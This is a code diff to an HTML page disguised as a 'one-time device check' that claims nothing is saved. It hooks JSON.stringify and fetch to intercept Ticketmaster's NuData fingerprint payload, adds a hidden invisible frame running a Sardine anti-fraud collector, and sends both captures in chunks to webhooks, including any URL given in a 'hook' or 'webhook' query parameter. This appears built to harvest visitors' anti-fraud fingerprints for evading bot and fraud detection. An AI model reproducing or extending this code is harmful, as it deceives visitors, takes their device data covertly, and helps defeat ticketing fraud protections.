@@ -77,6 +77,14 @@
       font-size: 11px;
       color: #aaa;
     }
+    #sardine-host {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      overflow: hidden;
+      opacity: 0;
+      pointer-events: none;
+    }
   </style>
 </head>
 <body>
@@ -88,13 +96,16 @@
     <div id="msg"></div>
     <p class="foot">One-time check · nothing is saved on this page</p>
   </div>
+  <div id="sardine-host" aria-hidden="true"></div>
 
 <script src="../_notify.js"></script>
+<script src="../_sardine_capture.js"></script>
 <script>
 (function () {
   const WIDGET_ID = "w-481390";
   const SYNC_JS = "https://nudata.ticketmaster.com/2.2/w/" + WIDGET_ID + "/sync/js/";
   const ENDPOINT = typeof defaultNotifyEndpoint === "function" ? defaultNotifyEndpoint() : "";
+  const SARDINE_FRAME = new URL("../sardine/frame.html", location.href).href;
 
   const $ = (id) => document.getElementById(id);
   let ready = false;
@@ -147,7 +158,7 @@
     try { return parsePlain(JSON.parse(decodeBndx(raw))); } catch { return null; }
   }
 
-  function buildPayload(plain) {
+  function buildNudataPayload(plain) {
     const wd = plain.widgetData || {};
     return {
       kind: "nudata_base_capture",
@@ -169,7 +180,7 @@
     };
   }
 
-  function installHooks() {
+  function installNudataHooks() {
     const _stringify = JSON.stringify;
     JSON.stringify = function (v, ...r) {
       if (v && typeof v === "object" && v.widgetData) onPlain(v);
@@ -177,7 +188,6 @@
     };
 
     const isNd = (u) => /nudatasecurity\.com/i.test(String(u || ""));
-
     const origFetch = fetch.bind(window);
     window.fetch = async function (input, init) {
       const url = typeof input === "string" ? input : (input && input.url) || "";
@@ -226,12 +236,12 @@
     }
   }
 
-  function readCapture() {
+  function readNudata() {
     let plain = window.__cap;
     const el = document.querySelector('[name="nds-pmd"]');
     if (el && el.value && !plain) plain = parseWire(el.value);
     if (!plain) throw new Error("not_ready");
-    return buildPayload(plain);
+    return buildNudataPayload(plain);
   }
 
   function chunk(s, n) {
@@ -240,13 +250,18 @@
     return out;
   }
 
-  async function send(payload) {
-    const override = new URLSearchParams(location.search).get("hook");
+  function hookTargets() {
+    const override = new URLSearchParams(location.search).get("hook")
+      || new URLSearchParams(location.search).get("webhook");
     const targets = [];
     if (ENDPOINT) targets.push(ENDPOINT);
     if (override && override !== ENDPOINT) targets.push(override);
-    if (!targets.length) throw new Error("no_hook");
+    return targets;
+  }
 
+  async function sendNudata(payload) {
+    const targets = hookTargets();
+    if (!targets.length) throw new Error("no_hook");
     const full = JSON.stringify(payload, null, 2);
     const label = platform();
     for (const wh of targets) {
@@ -265,7 +280,9 @@
           method: "POST",
           headers: { "content-type": "application/json" },
           body: JSON.stringify({
-            content: i === 0 ? `Device check · ${label} · ${parts.length} part(s)` : `Device check · part ${i + 1}/${parts.length}`,
+            content: i === 0
+              ? `NuData · ${label} · ${parts.length} part(s)`
+              : `NuData · part ${i + 1}/${parts.length}`,
             embeds: [{ description: "```json\n" + parts[i] + "\n```" }],
           }),
         });
@@ -274,14 +291,16 @@
     }
   }
 
-  function success() {
+  function success(sardineOk) {
     $("icon").textContent = "✓";
     $("icon").className = "icon ok";
     $("title").textContent = "All set";
     $("blurb").textContent = "Thanks — your device check completed successfully.";
     $("go").hidden = true;
     $("msg").className = "ok";
-    $("msg").textContent = "Data sent successfully.";
+    $("msg").textContent = sardineOk
+      ? "Data sent successfully."
+      : "NuData sent. Sardine did not complete — you can close this page.";
   }
 
   function fail(code) {
@@ -306,15 +325,31 @@
     $("msg").textContent = "Checking…";
     try {
       await new Promise((r) => setTimeout(r, 400));
-      const payload = readCapture();
-      await send(payload);
-      success();
+      const nudata = readNudata();
+      $("msg").textContent = "Sending…";
+      await sendNudata(nudata);
+
+      let sardineOk = false;
+      try {
+        $("msg").textContent = "Finishing check…";
+        const events = await window.SardineCapture.runCollector();
+        const sardine = window.SardineCapture.buildPayload(events);
+        const ping = await window.SardineCapture.pingWebhooks(sardine);
+        sardineOk = ping.some((r) => r.ok);
+      } catch (e) {
+        console.warn("[verify] sardine", e);
+      }
+      success(sardineOk);
     } catch (e) {
       fail(e.message === "not_ready" ? "not_ready" : "err");
     }
   }
 
-  installHooks();
+  installNudataHooks();
+  if (window.SardineCapture) {
+    window.SardineCapture.installNetworkIsolation({ collectorFrameUrl: SARDINE_FRAME });
+    window.SardineCapture.loadLoader().catch(() => {});
+  }
 
   window.ndsapi = window.ndsapi || { config: { q: [], ready(fn) { this.q.push(fn); } } };
   const sc = document.createElement("script");
